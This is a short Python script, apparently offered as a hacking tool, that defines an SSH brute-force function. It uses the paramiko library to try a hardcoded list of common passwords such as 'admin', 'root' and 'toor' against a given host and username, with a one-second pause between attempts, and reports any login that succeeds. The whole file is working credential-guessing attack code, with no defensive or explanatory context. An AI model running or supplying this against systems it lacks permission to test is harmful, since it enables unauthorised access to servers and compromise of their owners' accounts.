import paramiko
import time


def ssh_bruteforce(ip, port, username, password_list=[
        'password',
        '123456',
        'admin',
        'root',
        'toor',
        'letmein'
    ]
):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            client.connect(ip, port, username, password, timeout=3)
            print(f'Success! Username: {username}, Password: {password}')
            client.close()
            return True
        except paramiko.AuthenticationException:
            print(f'Failed: {password}')
            time.sleep(1)  # Attendre 1 seconde entre les tentatives
        except Exception as e:
            print(f'Error: {e}')
            time.sleep(1)

    return False